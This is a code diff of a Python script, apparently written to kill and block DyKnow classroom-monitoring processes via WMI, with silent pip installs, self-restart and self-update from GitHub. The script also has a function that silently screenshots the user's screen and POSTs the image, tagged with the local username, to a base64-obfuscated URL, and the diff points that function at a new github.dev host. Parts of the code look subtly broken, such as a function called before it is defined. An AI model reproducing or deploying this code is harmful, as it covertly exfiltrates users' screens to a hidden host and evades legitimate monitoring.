@@ -1,4 +1,4 @@
-import os.path, subprocess, glob, time, signal, sys
+import os.path, subprocess, glob, time, signal, sys, threading
 import urllib.request as r
 import urllib.error, hashlib, hmac, base64, getpass
 
@@ -11,20 +11,27 @@ def importinstall(pipname,modulename=None,update=False,**importkwargs):
         except ImportError:
             pass
     os.system(rf'pip install{" --upgrade" if update else ""} {pipname}')
+    restartafterdelay(1)
     return __import__(modulename)
 
 pyscreeze = importinstall('pyscreeze')
+wmi = importinstall('wmi')
+c = wmi.WMI()
+
+def restartafterdelay(t, file=__file__):
+    subprocess.run(f"python -c import time, os; time.sleep({t}); os.system(\"python {file}\")")
 
 def a():
-    u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
-
+    u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').decode()
+    if pre := hasattr(request(u, method='HEAD'),"getcode"):
+        print(pre)
+        return
     try:
-        if pre := hasattr(request(u, method='HEAD'),"getcode"):
-            print(pre)
-            return
         img = pyscreeze.screenshot()
+        print('e')
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
+        print('e')
         with open('tmp.png', 'rb') as imgbytes:
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
     except Exception as e:
@@ -52,11 +59,11 @@ if not os.path.exists(dynomaindir):
     input("U no have Dyknow! Press enter to exit.")
     sys.exit()
 
-checkupdates=True
+checkupdates = True
 
 data = request("https://raw.githubusercontent.com/magentapenguin/dy-no/master/nodyno.py")
 try:
-    with open(sys.argv[0], "rb") as f:
+    with open(__file__, "rb") as f:
         filedata = f.read()
 except:
     filedata = b""
@@ -73,7 +80,7 @@ verbose = True
 usednames = []
 
 
-def f(x):
+def f_old(x):
     out = subprocess.call(rf'wmic process where name="{x}" delete', shell=True)
     if verbose:
         if not out:
@@ -81,7 +88,7 @@ def f(x):
         else:
             print("failed",x, "code:",out,file=sys.stderr)
 
-def f2():
+def f2_old():
     stop = False
     def close(*args):
         nonlocal stop
@@ -95,10 +102,29 @@ def f2():
            x = os.path.split(x)[1]
            if x in ignore:
                continue
-           f(x)
+           f_old(x)
            usednames.append(x)
            #print(usednames)
-    
+
+def f2():
+    for process in c.Win32_Process():
+        for x in glob.iglob(dynodir+r"\*.exe"):
+            x = os.path.split(x)[1]
+            if x in ignore:
+                continue
+            if process.name == x:  
+                process.Terminate()
+                print('*bonk*', process.name)
+    process_watcher = c.Win32_Process.watch_for("creation")
+    while True:
+        new_process = process_watcher()
+        for x in glob.iglob(dynodir+r"\*.exe"):
+            x = os.path.split(x)[1]
+            if x in ignore:
+                continue
+            if new_process.name == x:
+                new_process.Terminate()
+                print('*bonk*', new_process.name)
 
 if __name__ == '__main__':
     f2()
